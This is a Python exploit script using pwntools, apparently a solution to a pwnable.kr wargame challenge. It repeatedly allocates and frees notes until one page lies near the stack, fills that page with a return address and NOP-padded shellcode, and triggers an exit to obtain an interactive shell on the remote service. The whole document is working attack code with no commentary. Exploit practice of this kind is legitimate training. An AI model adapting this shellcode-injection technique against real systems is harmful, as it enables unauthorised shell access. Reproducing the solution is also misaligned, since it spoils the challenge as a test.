#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = remote('pwnable.kr', 9019)
else:
    conn = process(['/home/doublesine/Desktop/echo2'])

def Sendline(s):
    print(s)
    conn.sendline(s)
    sleep(0.1)

def CreateNote():
    Sendline('1')

    print conn.readuntil('no '),
    no = int(conn.readline())
    print(no)

    print conn.readuntil('['),
    addr = conn.readuntil(']')
    print addr,
    addr = int(addr.replace(']', ''), 16)

    return no, addr

def DeleteNote(no):
    Sendline('4')
    print conn.read(),
    Sendline(str(no))

pages = []
page_max_addr = 0
page_max_no = 0
esp = 0xffffd820
shellcode = asm(shellcraft.sh()) + '\n'
while len(shellcode) % 4 != 0:
    shellcode = '\x90' + shellcode

sleep(11)
while True:
    print conn.read(),
    if page_max_addr < esp:
        if len(pages) < 256:
            no, page_addr = CreateNote()
            pages.append((no, page_addr))
            if page_addr > page_max_addr:
                page_max_addr = page_addr
                page_max_no = no
        else:
            for page in pages:
                if page[0] != page_max_no:
                    DeleteNote(page[0])
                    pages.remove(page)
                    break
        esp -= 4 + 4 + 0x428
        print('esp = 0x%08x, (page_max_no, page_max_addr) = (%d, 0x%08x)' % (esp, page_max_no, page_max_addr))
    else:
        break

shellcode_addr = page_max_addr + 4096 - len(shellcode)
padding = ((4096 - len(shellcode)) // 4) * pack(shellcode_addr, 32)

# write shellcode
Sendline('2')
print conn.read(),
Sendline(str(page_max_no))
print conn.read(),
conn.send_raw(padding + shellcode)
sleep(0.1)
print conn.read(),
# exit to get shell
Sendline('5')
conn.interactive()
conn.close()
